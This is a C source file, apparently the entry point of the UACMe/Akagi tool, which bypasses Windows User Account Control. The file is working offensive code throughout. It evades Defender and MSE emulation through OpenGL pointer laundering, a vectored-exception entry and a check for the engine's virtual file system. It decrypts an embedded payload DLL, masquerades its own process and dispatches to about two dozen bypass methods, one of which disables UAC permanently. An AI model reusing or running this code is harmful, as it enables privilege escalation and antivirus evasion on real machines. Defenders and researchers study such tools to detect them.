/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2017
*
*  TITLE:       MAIN.C
*
*  VERSION:     2.58
*
*  DATE:        13 Mar 2017
*
*  Program entry point.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#define OEMRESOURCE
#include "global.h"
#include <gl\GL.h>
#pragma comment(lib, "opengl32.lib")
#pragma comment(lib, "comctl32.lib")

UACMECONTEXT g_ctx;
TEB_ACTIVE_FRAME_CONTEXT g_fctx = { 0, "=^_^=" };

static pfnDecompressPayload pDecryptPayload = NULL;

/*
* DummyWindowProc
*
* Purpose:
*
* Part of antiemulation, does nothing, serves as a window for ogl operations.
*
*/
LRESULT CALLBACK DummyWindowProc(
    HWND hwnd,
    UINT uMsg,
    WPARAM wParam,
    LPARAM lParam
    )
{
    switch (uMsg) {
    case WM_CLOSE:
        PostQuitMessage(0);
        break;
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

/*
* ucmInit
*
* Purpose:
*
* Prestart phase with MSE / Windows Defender anti-emulation part.
*
*/
UINT ucmInit(
    VOID
    )
{
    BOOL        cond = FALSE;
    DWORD       Result = ERROR_SUCCESS;
    PVOID       Ptr;
    MSG         msg1;
    WNDCLASSEX  wincls;
    HINSTANCE   inst;
    BOOL        rv = 1;
    HWND        TempWindow;
    HGLRC       ctx;
    HDC         dc1;
    int         index;
#ifndef _DEBUG
    TOKEN_ELEVATION_TYPE    ElevType;
#endif	

    ULONG bytesIO, dwType, DataSize = 0;
    WCHAR szBuffer[MAX_PATH + 1];
    WCHAR WndClassName[] = TEXT("reirraC");
    WCHAR WndTitleName[] = TEXT("igakA");

    PIXELFORMATDESCRIPTOR pfd = {
        sizeof(PIXELFORMATDESCRIPTOR),
        1,
        PFD_DRAW_TO_WINDOW | PFD_SUPPORT_OPENGL | PFD_DOUBLEBUFFER | PFD_SWAP_EXCHANGE | PFD_GENERIC_ACCELERATED,
        PFD_TYPE_RGBA,
        32, 8, 0, 8, 0, 8, 0, 8, 0,
        0, 0, 0, 0, 0, 32, 0, 0,
        PFD_MAIN_PLANE, 0, 0, 0, 0
    };

    do {
        //we could read this from usershareddata but why not use it
        bytesIO = 0;
        RtlQueryElevationFlags(&bytesIO);
        if ((bytesIO & DBG_FLAG_ELEVATION_ENABLED) == 0) {
            Result = ERROR_ELEVATION_REQUIRED;
            break;
        }

        if (FAILED(CoInitialize(NULL))) {
            Result = ERROR_INTERNAL_ERROR;
            break;
        }

        InitCommonControls();

        //fill common data block
        RtlSecureZeroMemory(&g_ctx, sizeof(g_ctx));

        g_ctx.Flag = AKAGI_FLAG_KILO;
        g_ctx.Peb = NtCurrentPeb();
        inst = g_ctx.Peb->ImageBaseAddress;

        dwType = 0;
        bytesIO = 0;
        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
        GetCommandLineParam(GetCommandLine(), 1, szBuffer, MAX_PATH, &bytesIO);
        if (bytesIO == 0) {
            return ERROR_BAD_ARGUMENTS;
        }
        g_ctx.Method = strtoul(szBuffer);
        if (g_ctx.Method == 0 || g_ctx.Method >= UacMethodMax) {
            return ERROR_BAD_ARGUMENTS;
        }

        if (g_ctx.Method == UacMethodSXS)
            g_ctx.Flag = AKAGI_FLAG_TANGO;

#ifndef _DEBUG
        ElevType = TokenElevationTypeDefault;
        if (supGetElevationType(&ElevType)) {
            if (ElevType != TokenElevationTypeLimited) {
                return ERROR_UNSUPPORTED_TYPE;
            }
        }
#endif

        wincls.cbSize = sizeof(WNDCLASSEX);
        wincls.style = CS_OWNDC;
        wincls.lpfnWndProc = &DummyWindowProc;
        wincls.cbClsExtra = 0;
        wincls.cbWndExtra = 0;
        wincls.hInstance = inst;
        wincls.hIcon = NULL;
        wincls.hCursor = (HCURSOR)LoadImage(NULL, MAKEINTRESOURCE(OCR_NORMAL), IMAGE_CURSOR, 0, 0, LR_SHARED);
        wincls.hbrBackground = NULL;
        wincls.lpszMenuName = NULL;
        wincls.lpszClassName = WndClassName;
        wincls.hIconSm = 0;
        RegisterClassEx(&wincls);

        TempWindow = CreateWindowEx(WS_EX_TOPMOST, WndClassName, WndTitleName,
            WS_VISIBLE | WS_POPUP | WS_CLIPCHILDREN | WS_CLIPSIBLINGS, 0, 0, 30, 30, NULL, NULL, inst, NULL);

        //remember dll handles
        g_ctx.hKernel32 = GetModuleHandleW(KERNEL32_DLL);
        if (g_ctx.hKernel32 == NULL) {
            Result = ERROR_INVALID_HANDLE;
            break;
        }

        g_ctx.hOle32 = GetModuleHandleW(OLE32_DLL);
        if (g_ctx.hOle32 == NULL) {
            g_ctx.hOle32 = LoadLibraryW(OLE32_DLL);
            if (g_ctx.hOle32 == NULL) {
                Result = ERROR_INVALID_HANDLE;
                break;
            }
        }
        g_ctx.hShell32 = GetModuleHandleW(SHELL32_DLL);
        if (g_ctx.hShell32 == NULL) {
            g_ctx.hShell32 = LoadLibraryW(SHELL32_DLL);
            if (g_ctx.hShell32 == NULL) {
                Result = ERROR_INVALID_HANDLE;
                break;
            }
        }

        //query basic directories
        supExpandEnvironmentStrings(L"%systemroot%\\system32\\", g_ctx.szSystemDirectory, MAX_PATH);
        supExpandEnvironmentStrings(L"%temp%\\", g_ctx.szTempDirectory, MAX_PATH);

        //query build number
        RtlGetNtVersionNumbers(NULL, NULL, &g_ctx.dwBuildNumber);
        g_ctx.dwBuildNumber &= 0x00003fff;

        if (g_ctx.dwBuildNumber < 7000) {
            Result = ERROR_INSTALL_PLATFORM_UNSUPPORTED;
            break;
        }

        g_ctx.IsWow64 = supIsProcess32bit(GetCurrentProcess());

        if (g_ctx.dwBuildNumber > 14997) {
            g_ctx.IFileOperationFlags = FOF_NOCONFIRMATION | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION;
        }
        else {
            g_ctx.IFileOperationFlags = FOF_NOCONFIRMATION | FOF_SILENT | FOFX_SHOWELEVATIONPROMPT | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION;
        }

        //flashes and sparks
        dc1 = GetDC(TempWindow);
        index = ChoosePixelFormat(dc1, &pfd);
        SetPixelFormat(dc1, index, &pfd);
        ctx = wglCreateContext(dc1);
        wglMakeCurrent(dc1, ctx);
        glDrawBuffer(GL_BACK);
        glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);
        glMatrixMode(GL_PROJECTION);
        glLoadIdentity();
        glBegin(GL_TRIANGLES);
        glColor4i(1, 0, 1, 0);
        glVertex2i(-1, -1);
        glVertex2i(0, 1);
        glVertex2i(1, -1);
        glEnd();
#pragma warning(disable: 4054)//code to data
        Ptr = (PVOID)&DecompressPayload;
#pragma warning(default: 4054)
        pDecryptPayload = NULL;
#ifdef _WIN64
        glDrawPixels(2, 1, GL_RGBA, GL_UNSIGNED_BYTE, &Ptr);
        glReadPixels(0, 0, 2, 1, GL_RGBA, GL_UNSIGNED_BYTE, (GLvoid *)&pDecryptPayload);
#else
        glDrawPixels(1, 1, GL_RGBA, GL_UNSIGNED_BYTE, &Ptr);
        glReadPixels(0, 0, 1, 1, GL_RGBA, GL_UNSIGNED_BYTE, (GLvoid *)&pDecryptPayload);
#endif
        SwapBuffers(dc1);
        SendMessage(TempWindow, WM_CLOSE, 0, 0);

        do {
            rv = GetMessage(&msg1, NULL, 0, 0);

            if (rv == -1)
                break;

            TranslateMessage(&msg1);
            DispatchMessage(&msg1);
        } while (rv != 0);

        UnregisterClass(WndClassName, inst);

        DataSize = 0;

        switch (g_ctx.Method) {
        case UacMethodAVrf:
            dwType = HIBIKI_ID;
            break;
        case UacMethodSXSConsent:
            dwType = IKAZUCHI_ID;
            break;
        default:
            dwType = FUBUKI_ID;
            break;
        }

        Ptr = supLdrQueryResourceData(dwType, g_ctx.Peb->ImageBaseAddress, &DataSize);
        if (Ptr != NULL) {
            g_ctx.PayloadDll = pDecryptPayload(Ptr, DataSize, &g_ctx.PayloadDllSize);
        }

        if (g_ctx.PayloadDll == NULL) {
            Result = ERROR_INVALID_DATA;
            break;
        }

    } while (cond);

    return Result;
}

/*
* ucmMain
*
* Purpose:
*
* Program entry point.
*
*/
UINT ucmMain()
{
    DWORD   paramLen;
    WCHAR  *pFileName;
    WCHAR   szBuffer[MAX_PATH * 2];
    UINT    uResult;

    supCheckMSEngineVFS();

    uResult = ucmInit();
    switch (uResult) {

    case ERROR_ELEVATION_REQUIRED:
        ucmShowMessage(TEXT("Please enable UAC for this account."));
        break;

    case ERROR_UNSUPPORTED_TYPE:
        ucmShowMessage(TEXT("Admin account with limited token required."));
        break;

    case ERROR_INSTALL_PLATFORM_UNSUPPORTED:
        ucmShowMessage(TEXT("This Windows version is not supported."));
        break;

    case ERROR_BAD_ARGUMENTS:
        ucmShowMessage(TEXT("Usage: Akagi.exe [Method] [OptionalParamToExecute]"));
        break;
    default:
        break;

    }
    if (uResult != ERROR_SUCCESS) {
        return ERROR_INTERNAL_ERROR;
    }

    supMasqueradeProcess();

    //check OS version first
    switch (g_ctx.Method) {

    case UacMethodSysprep1://cryptbase
        if (g_ctx.dwBuildNumber > 9200) {
            if (ucmShowQuestion(UACFIX) == IDNO)
                return ERROR_UNSUPPORTED_TYPE;
        }
        break;

    case UacMethodSysprep2://shcore
        if (g_ctx.dwBuildNumber != 9600) {
            ucmShowMessage(WINBLUEWANTED);
            return ERROR_UNSUPPORTED_TYPE;
        }
        break;

    case UacMethodSysprep3://dbgcore
        if (g_ctx.dwBuildNumber != 10240) {
            if (ucmShowQuestion(UACFIX) == IDNO)
                return ERROR_UNSUPPORTED_TYPE;
        }
        break;

    case UacMethodOobe://oobe service
        //fixed in 10548
        if (g_ctx.dwBuildNumber >= 10548) {
            if (ucmShowQuestion(UACFIX) == IDNO)
                return ERROR_UNSUPPORTED_TYPE;
        }
        break;

    case UacMethodRedirectExe:
#ifndef _WIN64
        if (g_ctx.dwBuildNumber > 9600) {
            if (ucmShowQuestion(UACFIX) == IDNO)
                return ERROR_UNSUPPORTED_TYPE;
        }
#else 
        ucmShowMessage(WOW64WIN32ONLY);
        return ERROR_UNSUPPORTED_TYPE;
#endif
        break;

    case UacMethodSimda:
        //fixed in 10136
        if (g_ctx.dwBuildNumber >= 10136) {
            if (ucmShowQuestion(UACFIX) == IDNO)
                return ERROR_UNSUPPORTED_TYPE;
        }
        break;

    case UacMethodCarberp1:
        //fixed in 10147
        if (g_ctx.dwBuildNumber >= 10147) {
            if (ucmShowQuestion(UACFIX) == IDNO)
                return ERROR_UNSUPPORTED_TYPE;
        }
        break;

    case UacMethodCarberp2:
        //fixed in 10147
        if (g_ctx.dwBuildNumber >= 10147) {
            if (ucmShowQuestion(UACFIX) == IDNO)
                return ERROR_UNSUPPORTED_TYPE;
        }
        break;

    case UacMethodTilon:
        if (g_ctx.dwBuildNumber > 9200) {
            if (ucmShowQuestion(UACFIX) == IDNO)
                return ERROR_UNSUPPORTED_TYPE;
        }
        break;

    case UacMethodAVrf:
        //fixed in 10136
        if (g_ctx.dwBuildNumber >= 10136) {
            if (ucmShowQuestion(UACFIX) == IDNO)
                return ERROR_UNSUPPORTED_TYPE;
        }
        break;

    case UacMethodWinsat:
        //fixed in 10548
        if (g_ctx.dwBuildNumber >= 10548) {
            if (ucmShowQuestion(UACFIX) == IDNO)
                return ERROR_UNSUPPORTED_TYPE;
        }
        break;

    case UacMethodShimPatch:
#ifndef _WIN64
        if (g_ctx.dwBuildNumber > 9600) {
            if (ucmShowQuestion(UACFIX) == IDNO)
                return ERROR_UNSUPPORTED_TYPE;
        }
#else
        ucmShowMessage(WOW64WIN32ONLY);
        return ERROR_UNSUPPORTED_TYPE;
#endif
        break;

    case UacMethodMMC1:
#ifndef _WIN64
        ucmShowMessage(WIN64ONLY);
        return ERROR_UNSUPPORTED_TYPE;
#else
        //fixed in 14316
        if (g_ctx.dwBuildNumber >= 14316) {
            if (ucmShowQuestion(UACFIX) == IDNO)
                return ERROR_UNSUPPORTED_TYPE;
        }
#endif	
        break;

    case UacMethodSirefef:

        //fixed in 10548
        if (g_ctx.dwBuildNumber >= 10548) {
            if (ucmShowQuestion(UACFIX) == IDNO)
                return ERROR_UNSUPPORTED_TYPE;
        }
        break;

    case UacMethodGeneric:

        //fixed in 14316
        if (g_ctx.dwBuildNumber >= 14316) {
            if (ucmShowQuestion(UACFIX) == IDNO)
                return ERROR_UNSUPPORTED_TYPE;
        }
        break;

    case UacMethodGWX:
        if (g_ctx.dwBuildNumber < 7600) {
            ucmShowMessage(OSTOOOLD);
            return ERROR_UNSUPPORTED_TYPE;
        }

        //fixed in 14316
        if (g_ctx.dwBuildNumber >= 14316) {
            if (ucmShowQuestion(UACFIX) == IDNO)
                return ERROR_UNSUPPORTED_TYPE;
        }
        break;

    case UacMethodSysprep4:
        if (g_ctx.dwBuildNumber < 9600) {
            ucmShowMessage(WINBLUEWANTED);
            return ERROR_UNSUPPORTED_TYPE;
        }

        //fixed in 14371
        if (g_ctx.dwBuildNumber > 14367) {
            if (ucmShowQuestion(UACFIX) == IDNO)
                return ERROR_UNSUPPORTED_TYPE;
        }
        break;

    case UacMethodManifest:

        //fixed in 14371
        if (g_ctx.dwBuildNumber > 14367) {
            if (ucmShowQuestion(UACFIX) == IDNO)
                return ERROR_UNSUPPORTED_TYPE;
        }
        break;

    case UacMethodInetMgr:
#ifndef _WIN64
        ucmShowMessage(WIN64ONLY);
        return ERROR_UNSUPPORTED_TYPE;
#else 
        //fixed in 14376
        if (g_ctx.dwBuildNumber > 14372) {
            if (ucmShowQuestion(UACFIX) == IDNO)
                return ERROR_UNSUPPORTED_TYPE;
        }
#endif
        break;

    case UacMethodMMC2:
#ifndef _WIN64
        ucmShowMessage(WIN64ONLY);
        return ERROR_UNSUPPORTED_TYPE;
#else
#endif
        break;

    case UacMethodSXS:
#ifndef _WIN64
        ucmShowMessage(WIN64ONLY);
        return ERROR_UNSUPPORTED_TYPE;
#else
#endif
        break;

    case UacMethodSXSConsent: //for smehuechki
#ifndef _WIN64
        ucmShowMessage(WIN64ONLY);
        return ERROR_UNSUPPORTED_TYPE;
#else
#endif
        break;

    case UacMethodDISM:
#ifndef _WIN64
        ucmShowMessage(WIN64ONLY);
        return ERROR_UNSUPPORTED_TYPE;
#else
#endif
        break;

    case UacMethodComet:
        //fixed in 15031
        if (g_ctx.dwBuildNumber >= 15031) {
            if (ucmShowQuestion(UACFIX) == IDNO)
                return ERROR_UNSUPPORTED_TYPE;
        }
        break;

    case UacMethodEnigma0x3:
        //fixed in 15031
        if (g_ctx.dwBuildNumber >= 15031) {
            if (ucmShowQuestion(UACFIX) == IDNO)
                return ERROR_UNSUPPORTED_TYPE;
        }
        break;

    case UacMethodEnigma0x3_2:
        //partially fixed in 15031, main advantage of this method is lost
        if (g_ctx.dwBuildNumber >= 15031) {
            if (ucmShowQuestion(UACFIX) == IDNO)
                return ERROR_UNSUPPORTED_TYPE;
        }

#ifndef _DEBUG
        if (g_ctx.dwBuildNumber < 10240) {
            ucmShowMessage(WIN10ONLY);
            return ERROR_UNSUPPORTED_TYPE;
        }
#endif
        //
        // Ban usage under wow64 
        // (dismhost is x64 and x64 dlls are not present in 32bit version of this tool).
        //
        if (g_ctx.IsWow64) {
            ucmShowMessage(WOW64STRING);
            return ERROR_UNSUPPORTED_TYPE;
        }
        break;

    case UacMethodExpLife:
        break;

    case UacMethodSandworm:
        //
        // Fixed by KB2919355
        //
        if (g_ctx.dwBuildNumber >= 9600) {
            if (ucmShowQuestion(UACFIX) == IDNO)
                return ERROR_UNSUPPORTED_TYPE;
        }
        break;
    }

    //prepare command for payload
    paramLen = 0;
    RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
    GetCommandLineParam(GetCommandLine(), 2, szBuffer, MAX_PATH, &paramLen);
    if (paramLen > 0) {
        if ((g_ctx.Method != UacMethodRedirectExe) && 
            (g_ctx.Method != UacMethodComet) && 
            (g_ctx.Method != UacMethodEnigma0x3)) 
        {
            supSetParameter((LPWSTR)&szBuffer, paramLen * sizeof(WCHAR));
        }
    }    

    //check environment and execute method if it met requirements
    switch (g_ctx.Method) {

    case UacMethodSysprep1:
    case UacMethodSysprep2:
    case UacMethodSysprep3:
    case UacMethodOobe:
    case UacMethodTilon:

#ifndef _DEBUG
        if (g_ctx.IsWow64) {
            ucmShowMessage(WOW64STRING);
            return ERROR_UNSUPPORTED_TYPE;
        }
#endif

        if (ucmStandardAutoElevation(g_ctx.Method, g_ctx.PayloadDll, g_ctx.PayloadDllSize)) {
            return ERROR_SUCCESS;
        }
        break;

        //
        //  Allow only in 32 version.
        //
#ifndef _WIN64
    case UacMethodRedirectExe:
    case UacMethodShimPatch:
        if (ucmAppcompatElevation(g_ctx.Method, g_ctx.PayloadDll, g_ctx.PayloadDllSize, (paramLen != 0) ? szBuffer : NULL)) {
            return ERROR_SUCCESS;
        }
        break;
#endif

    case UacMethodSimda:

#ifndef _DEBUG
        if (g_ctx.IsWow64) {
            ucmShowMessage(WOW64STRING);
            return ERROR_UNSUPPORTED_TYPE;
        }
#endif
        if (MessageBox(GetDesktopWindow(),
            TEXT("This method will permanently TURN UAC OFF, are you sure?"),
            PROGRAMTITLE, MB_ICONQUESTION | MB_YESNO) == IDYES)
        {
            if (ucmSimdaTurnOffUac()) {
                return ERROR_SUCCESS;
            }
        }
        break;

    case UacMethodCarberp1:
    case UacMethodCarberp2:

        if (g_ctx.Method == UacMethodCarberp1) {

            //there is no migmiz in syswow64 in 8+
            if ((g_ctx.IsWow64) && (g_ctx.dwBuildNumber > 7601)) {
                ucmShowMessage(WOW64STRING);
                return ERROR_UNSUPPORTED_TYPE;
            }
        }

        if (g_ctx.Method == UacMethodCarberp2) {
#ifndef _DEBUG
            if (g_ctx.IsWow64) {
                ucmShowMessage(WOW64STRING);
                return ERROR_UNSUPPORTED_TYPE;
            }
#endif
        }

        if (ucmWusaMethod(g_ctx.Method, g_ctx.PayloadDll, g_ctx.PayloadDllSize)) {
            return ERROR_SUCCESS;
        }
        break;

    case UacMethodAVrf:
#ifndef _DEBUG
        if (g_ctx.IsWow64) {
            ucmShowMessage(WOW64STRING);
            return ERROR_UNSUPPORTED_TYPE;
        }
#endif		
        if (ucmAvrfMethod(g_ctx.PayloadDll, g_ctx.PayloadDllSize)) {
            return ERROR_SUCCESS;
        }
        break;
        
    case UacMethodWinsat:
#ifndef _DEBUG
        if (g_ctx.IsWow64) {
            ucmShowMessage(LAZYWOW64UNSUPPORTED);
            return ERROR_UNSUPPORTED_TYPE;
        }
#endif
        if (g_ctx.dwBuildNumber < 9200) {
            pFileName = POWRPROF_DLL;
        }
        else {
            pFileName = DEVOBJ_DLL;
        }

        if (ucmWinSATMethod(pFileName, g_ctx.PayloadDll, g_ctx.PayloadDllSize, (g_ctx.dwBuildNumber <= 10136))) {
            return ERROR_SUCCESS;
        }
        break;

    case UacMethodMMC1:
#ifndef _DEBUG
        if (g_ctx.IsWow64) {
            ucmShowMessage(WOW64STRING);
            return ERROR_UNSUPPORTED_TYPE;
        }
#endif
        if (ucmMMCMethod(UacMethodMMC1, ELSEXT_DLL, g_ctx.PayloadDll, g_ctx.PayloadDllSize)) {
            return ERROR_SUCCESS;
        }
        break;
        
    case UacMethodSirefef:
#ifndef _DEBUG
        if (g_ctx.IsWow64) {
            ucmShowMessage(WOW64STRING);
            return ERROR_UNSUPPORTED_TYPE;
        }
#endif
        if (ucmSirefefMethod(g_ctx.PayloadDll, g_ctx.PayloadDllSize)) {
            return ERROR_SUCCESS;
        }
        break;

    case UacMethodGeneric:
#ifndef _DEBUG
        if (g_ctx.IsWow64) {
            ucmShowMessage(WOW64STRING);
            return ERROR_UNSUPPORTED_TYPE;
        }
#endif	
        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
        _strcpy(szBuffer, g_ctx.szSystemDirectory);
        _strcat(szBuffer, CLICONFG_EXE);
        if (ucmGenericAutoelevation(szBuffer, NTWDBLIB_DLL, g_ctx.PayloadDll, g_ctx.PayloadDllSize))
            return ERROR_SUCCESS;

        break;

    case UacMethodGWX:
#ifndef _DEBUG
        if (g_ctx.IsWow64) {
            ucmShowMessage(WOW64STRING);
            return ERROR_UNSUPPORTED_TYPE;
        }
#endif
        if (ucmGWX()) {
            return ERROR_SUCCESS;
        }
        break;

    case UacMethodSysprep4:
#ifndef _DEBUG
        if (g_ctx.IsWow64) {
            ucmShowMessage(WOW64STRING);
            return ERROR_UNSUPPORTED_TYPE;
        }
#endif
        if (ucmStandardAutoElevation2(g_ctx.PayloadDll, g_ctx.PayloadDllSize)) {
            return ERROR_SUCCESS;
        }
        break;

    case UacMethodManifest:
#ifndef _DEBUG
        if (g_ctx.IsWow64) {
            ucmShowMessage(LAZYWOW64UNSUPPORTED);
            return ERROR_UNSUPPORTED_TYPE;
        }
#endif
        if (ucmAutoElevateManifest(g_ctx.PayloadDll, g_ctx.PayloadDllSize)) {
            return ERROR_SUCCESS;
        }
        break;

//allow only in win64 version because of laziness
#ifdef _WIN64
    case UacMethodInetMgr:
        if (ucmInetMgrMethod()) {
            return ERROR_SUCCESS;
        }
        break;

    case UacMethodMMC2:
        if (ucmMMCMethod(UacMethodMMC2, WBEMCOMN_DLL, g_ctx.PayloadDll, g_ctx.PayloadDllSize)) {
            return ERROR_SUCCESS;
        }
        break;

    case UacMethodSXS:
        if (ucmSXSMethod(g_ctx.PayloadDll, g_ctx.PayloadDllSize, SYSPREP_DIR, SYSPREP_EXE, NULL, FALSE)) {
            return ERROR_SUCCESS;
        }
        break;

    case UacMethodSXSConsent:
        if (MessageBox(GetDesktopWindow(), TEXT("WARNING: This method will affect UAC interface, are you sure?"), PROGRAMTITLE, MB_YESNO) == IDYES) {
            if (ucmSXSMethod(g_ctx.PayloadDll, g_ctx.PayloadDllSize, NULL, CONSENT_EXE, EVENTVWR_EXE, TRUE)) {
                return ERROR_SUCCESS;
            }
        }
        break;

    case UacMethodDISM:
        if (ucmDismMethod(g_ctx.PayloadDll, g_ctx.PayloadDllSize)) {
            return ERROR_SUCCESS;
        }
        break;
        
#endif
    case UacMethodComet:
        if (ucmCometMethod((paramLen != 0) ? szBuffer : T_DEFAULT_CMD)) {
            return ERROR_SUCCESS;
        }
        break;

    case UacMethodEnigma0x3:
#ifndef _DEBUG
        if (g_ctx.IsWow64) { //target application isn't always available under wow64
            ucmShowMessage(WOW64STRING);
            return ERROR_UNSUPPORTED_TYPE;
        }
#endif

        if (g_ctx.dwBuildNumber >= 15007)
            pFileName = COMPMGMTLAUNCHER_EXE;
        else
            pFileName = EVENTVWR_EXE;
        
        if (ucmHijackShellCommandMethod((paramLen != 0) ? szBuffer : NULL, pFileName)) {
            return ERROR_SUCCESS;
        }
        break;

    case UacMethodEnigma0x3_2:
        if (ucmDiskCleanupRaceCondition()) {
            return ERROR_SUCCESS;
        }
        break;

    case UacMethodExpLife:
#ifndef _WIN64 //lazy
        if (g_ctx.IsWow64) { 
            ucmShowMessage(LAZYWOW64UNSUPPORTED);
            return ERROR_UNSUPPORTED_TYPE;
        }
#endif
        if (paramLen == 0) {
            RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
            supExpandEnvironmentStrings(T_DEFAULT_CMD, szBuffer, MAX_PATH);
        }

        if (ucmUninstallLauncherMethod(szBuffer)) {
            return ERROR_SUCCESS;
        }
        break;      
#ifdef _DEBUG
    case UacMethodTest:
        UACMeTest();
        break;
#endif

    case UacMethodSandworm:
#ifndef _DEBUG
        if (g_ctx.IsWow64) {
            ucmShowMessage(WOW64STRING);
            return ERROR_UNSUPPORTED_TYPE;
        }
#endif	
        if (ucmSandwormMethod()) {
            return ERROR_SUCCESS;
        }
        break;

    }

    return ERROR_ACCESS_DENIED;
}

DWORD g_ExCookie = 0;

LONG NTAPI ucmVehHandler(
    EXCEPTION_POINTERS *ExceptionInfo
)
{
    UACME_THREAD_CONTEXT *uctx;

    if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP)
        if (ExceptionInfo->ExceptionRecord->ExceptionFlags == g_ExCookie) {
            uctx = (UACME_THREAD_CONTEXT*)RtlGetFrame();
            while ((uctx != NULL) && (uctx->Frame.Context != &g_fctx)) {
                uctx = (UACME_THREAD_CONTEXT *)uctx->Frame.Previous;
            }
            if (uctx) {
                if (uctx->ucmMain)
                    uctx->ucmMain();
            }
            ExceptionInfo->ContextRecord->EFlags |= 0x10000;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    return EXCEPTION_CONTINUE_SEARCH;
}

/*
* main
*
* Purpose:
*
* Program entry point.
*
*/
VOID main()
{
    PVOID ExceptionHandler;
    DWORD k;
    EXCEPTION_RECORD ex;
    UACME_THREAD_CONTEXT uctx;

    RtlSecureZeroMemory(&uctx, sizeof(uctx)); 

    ExceptionHandler = RtlAddVectoredExceptionHandler(1, &ucmVehHandler);
    if (ExceptionHandler) {
        uctx.Frame.Context = &g_fctx;
        uctx.ucmMain = (pfnEntryPoint)ucmMain;
        RtlPushFrame((PTEB_ACTIVE_FRAME)&uctx);

#pragma warning(suppress: 28159)
        k = ~GetTickCount();
        g_ExCookie = RtlRandomEx(&k);

        RtlSecureZeroMemory(&ex, sizeof(ex));
        ex.ExceptionFlags = g_ExCookie;
        ex.ExceptionCode = (DWORD)STATUS_SINGLE_STEP;
        RtlRaiseException(&ex);

        RtlRemoveVectoredExceptionHandler(ExceptionHandler);
        RtlPopFrame((PTEB_ACTIVE_FRAME)&uctx);
    }
    ExitProcess(0);
}
